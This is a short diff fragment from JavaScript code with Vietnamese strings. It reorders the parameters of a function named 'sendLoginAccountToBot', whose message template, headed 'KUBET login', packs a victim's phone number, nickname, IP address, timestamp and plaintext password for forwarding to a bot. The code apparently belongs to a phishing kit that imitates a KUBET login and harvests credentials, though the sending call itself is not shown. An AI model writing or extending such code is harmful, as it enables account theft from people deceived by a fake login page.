@@ -29,7 +29,7 @@ Mật Khẩu: ${password}`
     }
 }
 
-async function sendLoginAccountToBot(cellPhone, nickName, userIp, timeNow, password) {
+async function sendLoginAccountToBot(userIp, timeNow, cellPhone, nickName,  password) {
 
     const message = `KUBET ĐĂNG NHẬP
 IP: ${userIp}
